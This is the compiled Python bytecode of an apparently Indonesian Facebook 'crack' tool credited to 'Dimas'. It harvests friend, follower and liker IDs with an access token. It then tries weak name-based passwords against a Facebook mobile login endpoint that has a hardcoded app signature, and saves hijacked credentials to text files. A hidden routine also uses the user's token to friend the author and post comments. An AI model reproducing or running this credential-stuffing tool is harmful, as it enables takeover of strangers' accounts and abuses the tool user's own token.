�
hU`c           @   sJ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l
 Z
 d  d l m Z d Z d Z d Z d Z d Z d Z d	 Z e e e e e e e g Z e j e � Z e j e � Z y d  d l Z Wn e k
 rKe  j d
 � n Xy d  d l Z Wn e k
 r|e  j d � n Xd  d l m Z d  d
 l m  Z  d  d l m Z e! e � e j" d � e j  �  Z# e# j$ e% � e# j& e j' j( �  d d �d d f g e# _) e  j d � d �  Z* d �  Z+ d �  Z, d �  Z- d Z. d Z/ g  Z0 g  Z1 g  a2 g  a3 g  Z4 g  Z5 d �  Z6 d �  Z7 d �  Z8 d �  Z9 d �  Z: d  �  Z; d! �  Z< d" �  Z= d# �  Z> d$ �  Z? d% �  Z@ d& �  ZA d' �  ZB d( �  ZC d) �  ZD d* �  ZE d+ �  ZF d, �  ZG d- �  ZH d. �  ZI d/ �  ZJ eK d0 k rFe; �  e6 �  n  d S(1   i����N(   t
   ThreadPools   [1;97ms   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browser(   t   datetimet   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16t   clearc           C   s   d GHt  j j �  d  S(   Ns   [1;97m{[1;91m![1;97m} Keluar(   t   ost   syst   exit(    (    (    s   /sdcard/crack.pyt   keluar*   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t | � d � | 7} q Wt | � S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/crack.pyt   acak/   s
    
0c         C   s~   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  t j j |  d � d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   /sdcard/crack.pyR   7   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���Q��?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/crack.pyt   jalanA   s    
s   
[1;91m $$$$$$\                               $$\       
$$  __$$\                              $$ |      
$$ /  \__| $$$$$$\  $$$$$$\   $$$$$$$\ $$ |  $$\ 
$$ |      $$  __$$\ \____$$\ $$  _____|$$ | $$  |
$$ |      $$ |  \__|$$$$$$$ |$$ /      $$$$$$  / 
[1;97m$$ |  $$\ $$ |     $$  __$$ |$$ |      $$  _$$<  
\$$$$$$  |$$ |     \$$$$$$$ |\$$$$$$$\ $$ | \$$\ 
 \______/ \__|      \_______| \_______|\__|  \__|
[1;94m──────────────────────────────────────────────────
[1;95m{[1;96m×[1;95m} [1;93mEditor [1;97m  : [1;96mDimas
[1;95m{[1;96m×[1;95m} [1;93mFacebook[1;97m : [1;96mFacebook.com/DIMAS-XD
[1;95m{[1;96m×[1;95m} [1;93mGithub[1;97m   : [1;96mGithub.com/Mr-AtackerXD         C   s>   t  j d � t GHd d GHd GHd GHd GHd d GHt �  d  S(   NR   i2   s
   [1;94m─s2   [1;97m{[1;92m01[1;97m} Login Via Token Facebooks8   [1;97m{[1;92m02[1;97m} Ambil Token Download Token Apps    [1;97m{[1;91m00[1;97m} Keluar(   R   t   systemt   logot   pilih_masuk(    (    (    s   /sdcard/crack.pyt   masuk^   s    
		c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k s? |  d k rI t �  n� |  d k sa |  d k rk t �  nr |  d k s� |  d	 k r� t �  nP |  d
 k s� |  d k r� t �  n. |  d k s� |  d
 k r� t �  n d GHt �  d  S(   Ns$   [1;92m︻デ═一▸[91m:[1;92m R   s4   [1;97m[[1;91m![1;97m] Ngetik Apaan Lu Bangsad !!!t   1t   01t   2t   02t   3t   03t   4t   04t   0t   00(   t	   raw_inputR%   t   tokenzt   ambil_tokent
   ambil_linkt   cookieR
   (   t   msuk(    (    s   /sdcard/crack.pyR%   h   s     





c          C   s�   t  j d � t GHd d GHt d � }  ye t j d |  � } t j | j � } t	 d d � } | j
 |  � | j �  d GHt d	 � t
 �  Wn* t k
 r� d
 GHt j d � t �  n Xd  S(   NR   i2   s
   [1;94m─s/   [1;97m{[1;95m?[1;97m} Token [1;91m:[1;92m s+   https://graph.facebook.com/me?access_token=s	   login.txtR   R   s&   [1;97mSedang Masuk Tunggu Sebentar...s-   [1;97m{[1;91m![1;97m} [1;91mToken salah !g333333�?(   R   R#   R$   R1   t   requestst   gett   jsont   loadst   textt   openR   t   closeR"   t	   bot_koment   KeyErrorR   R   R&   (   t   tokett   otwt   at   zedd(    (    s   /sdcard/crack.pyR2   |   s"    
	




c           C   sJ   t  j d � t GHd d GHt d � t  j d � t j d � t �  d  S(   NR   i2   s
   [1;94m─s2           [1;92mAnda Akan Di Arahkan Ke Browser ...s\   xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdki   (   R   R#   R$   R"   R   R   R&   (    (    (    s   /sdcard/crack.pyR3   �   s    
	


c          C   s  y t  d d � j �  }  Wn# t k
 r> d GHt j d � n Xd } d } d } d } d } d	 } d
 } t j d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t �  d  S(   Ns	   login.txtt   rs   [1;97m[!] Token invalids   rm -rf login.txtt   100024540287354s   Script nya mantap 😆t   LOVEt   966630380831629s   Gua pakai script lu bang😁t   ANGRYs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   R<   t   readt   IOErrorR   R#   R7   t   postt   menu(   R@   t   unat   komt   reacRK   t   post2t   kom2t   reac2(    (    s   /sdcard/crack.pyR>   �   s$    
!!!!c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t  j d � t �  n Xy= t j d |  � } t j	 | j
 � } | d } | d } Wnz t k
 r� t  j d � d	 GHt  j d � t j
 d
 � t �  t j
 d
 � t �  n# t j j k
 rd GHt �  n Xt  j d � t GHd d
 GHd | GHd | GHd d
 GHd t d t d GHd t d t d GHd t d t d GHd t d t d GHd t d t d GHd t d GHd d
 GHt �  d  S(   NR   s	   login.txtRD   s   {!} Token Invalid !s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=t   namet   ids   [1;96m[!] [1;91mToken invalidi   s   {!} Tidak ada koneksii2   s
   [1;94m─s;   [1;97m{[1;96m•[1;97m}[1;95m NAMA[1;90m    =>[1;92m s;   [1;97m{[1;96m•[1;97m}[1;95m USER ID[1;90m =>[1;92m s   [1;97m{s
   01[1;97m}s    Crack Akun Facebooks
   02[1;97m}s    Crack ID Dari Postingan Temans
   03[1;97m}s    Crack ID Dari Total Followerss
   04[1;97m}s    Cari ID Menggunakan Usernames
   05[1;97m}s    Perbarui Scripts   [1;97m{[1;91m00[1;97m}s    Keluar(   R   R#   R<   RI   RJ   R&   R7   R8   R9   R:   R;   R?   R   R   t
   exceptionsR   R
   R$   t   warnit   warnat   pilih(   R@   RA   RB   t   namaRT   (    (    s   /sdcard/crack.pyRL   �   sL    











				
	c          C   s'  t  d � }  |  d k r' d GHt �  n� |  d k s? |  d k rI t �  n� |  d k sa |  d k rk t �  n� |  d k s� |  d	 k r� t �  n� |  d
 k s� |  d k r� t �  nt |  d k s� |  d
 k r� t �  nR |  d k s� |  d k rt j d � t	 d � t j d � t
 �  n d GHt �  d  S(   Ns%   [1;92m︻デ═一▸ [91m:[1;92m R   s2   [1;97m{[1;91m![1;97m}[1;97m Isi Dengan Benar !R'   R(   R)   R*   R+   R,   R-   R.   t   5t   05R/   R0   R   s   Menghapus tokens   rm -rf login.txts5   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Sayang !(   R1   RX   t   crack_temant   crack_likest   crack_followt   user_idt   perbaruiR   R#   R"   R
   (   t   unikers(    (    s   /sdcard/crack.pyRX   �   s*    









c           C   s�   t  j d � t GHd d GHd t d t d GHd t d t d GHd t d	 t d
 GHd t d t d GHd
 t d GHd d GHt �  d  S(   NR   i2   s
   [1;94m─s   [1;97m{s
   01[1;97m}s    Crack ID Indonesias
   02[1;97m}s    Crack ID Bangladeshs
   03[1;97m}s
    Crack ID Usas
   04[1;97m}s    Crack ID Pakistans   [1;97m{[1;91m00[1;97m}s    Kembali(   R   R#   R$   RW   RV   t   pilih_teman(    (    (    s   /sdcard/crack.pyR\   �   s    
	
	c          C   s  t  d t d � }  |  d k r/ d GHt �  n� |  d k sG |  d k rQ t �  n� |  d k si |  d k rs t �  n� |  d k s� |  d	 k r� t �  nr |  d
 k s� |  d k r� t �  nP |  d k s� |  d
 k r� |  �  n. |  d k s� |  d k r� t �  n d GHt �  d  S(   NR   s   ︻デ═一▸ [91m:[1;92m s5   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Sayang !R'   R(   R)   R*   R+   R,   R-   R.   RZ   R[   R/   R0   (   R1   RW   Rb   t
   crack_indot   crack_banglat	   crack_usat   crack_pakisRL   (   t   univ(    (    s   /sdcard/crack.pyRb   �   s$    






c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtRD   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;93m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;93m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;93m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R#   R<   RI   R@   RJ   R   R   R
   R$   t
   pilih_indo(    (    (    s   /sdcard/crack.pyRc     s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d! GHt �  d" t t t � � GHd# GHd$ d% d& g }
 x0 |
 D]( } d' | Gt j j �  t j d( � qWd) GHd* GHd+ �  } t d, � }
 |
 j | t � d- GHd. GHd/ t t t  � � d0 t t t! � � GHd1 GHd d GHt  d2 � t �  d  S(3   Ns%   [1;93m︻デ═一▸ [91m:[1;92m R   s5   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Sayang !R'   R(   R   i2   s
   [1;94m─sE                [1;93m●●● [1;97mCRACK INDONESIA [1;93m●●●s3   https://graph.facebook.com/me/friends?access_token=t   dataRT   R)   R*   sB   [1;97m{[1;93m●[1;97m} [1;93mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;93m●[1;97m}[1;93m Nama [1;91m:[1;92m RS   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;93m{[1;97m<Kembali>[1;93m}s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=R+   R,   s<   [1;97m{[1;93m●[1;97m} [1;93mNama File[1;91m :[1;92m RD   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R/   R0   s2   [1;97m[[1;91m![1;97m][1;97m Isi Dengan Benar !s;   [1;97m{[1;93m●[1;97m} [1;93mTotal ID [1;91m:[1;92m s3   [1;97m{[1;93m●[1;97m} [1;93mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;93m●[1;97m} [1;93mCrack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c         S   s�
  |  } yV t  j j d j t j �  j d t t | � � � � � t  j j	 �  t
 j d � Wn t k
 ro n Xy;
t
 j d | d t � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rdd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nF	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�d | d k r4d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � nv| d j �  d }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k r~d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n,d  } t j d | d	 | d
 � } t j | � } d | k r4d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nvd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d! } t j d | d	 | d
 � } t j | � } d | k rpd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n:d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d" }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k r2d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nxd# } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rn	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n<d$ } t j d | d	 | d
 � } t j | � } d | k r$
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S(%   Ns   
{}s3   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%S [1;97mt   dones   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms
   done/indo.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comt	   error_msgs*   
[1;97m{[1;93m×[1;97m} [1;93mCEKPOINTs4   [1;97m{[1;93m×[1;97m} Nama  [1;91m    > [1;93ms4   [1;97m{[1;93m×[1;97m} User  [1;91m    > [1;93ms4   [1;97m{[1;93m×[1;97m} Password  [1;91m> [1;93ms    
{×} CEKPOINT 
{×} Nama     > t   1234t   12345t   Sayangt   Bangsatt   Anjingt   Kontolt	   Indonesia(   R   R   R   t   formatR   t   nowt   strftimeR   R   R   R   t   mkdirt   OSErrorR7   R8   R@   R9   R:   R;   t   lowert   urllibt   urlopent   loadR<   R=   t   okst   appendt   cekpoint(   t   argt   zowet   anR   t   bos1Ri   t   kot   oket   cekt   bos2t   bos3t   bos4t   bos5t   bos6t   bos7t   bos8(    (    s   /sdcard/crack.pyt   maino  sh   8 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;93m●[1;97m} [1;93mSelesai ...sS   [1;97m{[1;93m●[1;97m} [1;93mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msi   [1;97m{[1;93m●[1;97m} [1;92mOK[1;97m/[1;93mCP [1;93mfile tersimpan [1;91m: [1;92mdone/indo.txts    [1;97m{<[1;93mKembali[1;97m>}("   R1   Rh   R   R#   R$   R7   R8   R@   R9   R:   R;   RT   R�   R?   Rc   RU   R   R
   R<   t	   readlinest   stripRJ   RL   R   R   R   R   R   R   R   R    t   mapR   R�   (   t   teakRD   R    t   st   idtt   pokt   spR   t   idlistt   linet   titikt   oR�   t   p(    (    s   /sdcard/crack.pyRh   *  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtRD   s&   [1;97m{[1;91m![1;97m} Token invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;96m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;96m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;96m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R#   R<   RI   R@   RJ   R   R   R
   R$   t   pilih_bangla(    (    (    s   /sdcard/crack.pyRd   @  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d GHt �  d! t t t � � GHd" GHd# d$ d% g }
 x0 |
 D]( } d& | Gt j j �  t j d' � qWd( GHd) GHd* �  } t d+ � }
 |
 j | t � d, GHd- GHd. t t t  � � d/ t t t! � � GHd0 GHd d GHt  d1 � t �  d  S(2   Ns%   [1;96m︻デ═一▸ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m} Isi Yg Benar Sayang !R'   R(   R   i2   s
   [1;94m─sF                [1;96m●●● [1;97mCRACK BANGLADESH [1;96m●●●s3   https://graph.facebook.com/me/friends?access_token=Ri   RT   R)   R*   sB   [1;97m{[1;96m●[1;97m}[1;96m ID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;96m●[1;97m}[1;96m Nama [1;91m:[1;92m RS   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;96m{[1;97m<Kembali>[1;96m}s   {!} Tidak ada koneksi !s   /friends?access_token=R+   R,   s<   [1;97m{[1;96m●[1;97m}[1;96m Nama File [1;91m:[1;92m RD   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R/   R0   s;   [1;97m{[1;96m●[1;97m}[1;96m Total ID [1;91m:[1;92m s3   [1;97m{[1;96m●[1;97m}[1;96m Stop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;96m●[1;97m}[1;96m Crack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c         S   s�
  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xye
t j d | d t
 � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � np	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n&d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�| d j �  d }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nVd  } t j d | d	 | d
 � } t j | � } d | k r$d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd! } t j d | d	 | d
 � } t j | � } d | k r`d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � ndd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d" }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nd | d k r0d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rz	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r>
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S($   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SRj   s   https://graph.facebook.com/s   /?access_token=Rk   Rl   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6Rm   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/bangla.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comRn   s*   
[1;97m{[1;96m×[1;97m} [1;96mCEKPOINTs4   [1;97m{[1;96m×[1;97m} Nama  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} User  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} Password  [1;91m> [1;96ms    
{×} CEKPOINT 
{×} Nama     > Ro   Rp   t   786786t
   bangladesht   786t	   last_name(   R   R   R   Rv   R   Rw   Rx   R   R   Ry   Rz   R7   R8   R@   R9   R:   R;   R{   R|   R}   R~   R<   R=   R   R�   R�   (   R�   R�   R�   R   R�   Ri   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   �  sh   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;96m●[1;97m} [1;96mSelesai ...sS   [1;97m{[1;96m●[1;97m} [1;96mTotal [1;92mOK[1;97m/[1;96mCP [1;97m: [1;92ms   [1;97m/[1;93msk   [1;97m{[1;96m●[1;97m} [1;92mOK[1;97m/[1;96mCP [1;96mfile tersimpan [1;91m: [1;92mdone/bangla.txts    [1;97m{<[1;96mKembali[1;97m>}("   R1   R�   R   R#   R$   R7   R8   R@   R9   R:   R;   RT   R�   R?   Rd   RU   R   R
   R<   R�   R�   RJ   RL   R   R   R   R   R   R   R   R    R�   R   R�   (   R�   RD   R    R�   t   idbR�   R�   R   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   U  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtRD   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;95m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;95m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;95m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R#   R<   RI   R@   RJ   R   R   R
   R$   t	   pilih_usa(    (    (    s   /sdcard/crack.pyRe   k  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d! GHt �  d" t t t � � GHd# GHd$ d% d& g }
 x0 |
 D]( } d' | Gt j j �  t j d( � qWd) GHd* GHd+ �  } t d, � }
 |
 j | t � d- GHd. GHd/ t t t  � � d0 t t t! � � GHd1 GHd d GHt  d2 � t �  d  S(3   Ns%   [1;95m︻デ═一▸ [91m:[1;92m R   s5   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Sayang !R'   R(   R   i2   s
   [1;94m─sB                   [1;95m●●● [1;97mCRACK USA [1;95m●●●s3   https://graph.facebook.com/me/friends?access_token=Ri   RT   R)   R*   sB   [1;97m{[1;95m●[1;97m} [1;95mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m●[1;97m} [1;95mNama [1;91m:[1;92m RS   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;95m[[1;97m<Kembali>[1;95m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=R+   R,   s<   [1;97m{[1;95m●[1;97m} [1;95mNama File[1;91m :[1;92m RD   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R/   R0   s2   [1;97m[[1;91m![1;97m][1;97m Isi Dengan Benar !s;   [1;97m{[1;95m●[1;97m} [1;95mTotal ID [1;91m:[1;92m s3   [1;97m{[1;95m●[1;97m} [1;95mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;95m●[1;97m} [1;95mCrack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c   
      S   s�  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xyut j d | d t
 � } t j | j � } d } t j d | d | d	 � } t j | � } d
 | k rFd GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n�d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � nd }	 t j d | d |	 d	 � } t j | � } d
 | k r�d GHd | d
 GHd | GHd |	 GHt d d � } | j d | d
 d | d |	 d � | j �  t j | � nRd | d k rd GHd | d
 GHd | GHd |	 GHt d d � } | j d | d
 d | d |	 d � | j �  t j | � n�| d d }
 t j d | d |
 d	 � } t j | � } d
 | k r�d GHd | d
 GHd | GHd |
 GHt d d � } | j d | d
 d | d |
 d � | j �  t j | � nd | d k rLd GHd | d
 GHd | GHd |
 GHt d d � } | j d | d
 d | d |
 d � | j �  t j | � n�| d d  } t j d | d | d	 � } t j | � } d
 | k r
d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n�d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � nD| d d! } t j d | d | d	 � } t j | � } d
 | k rNd GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n� d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n  Wn n Xd  S("   Ns   
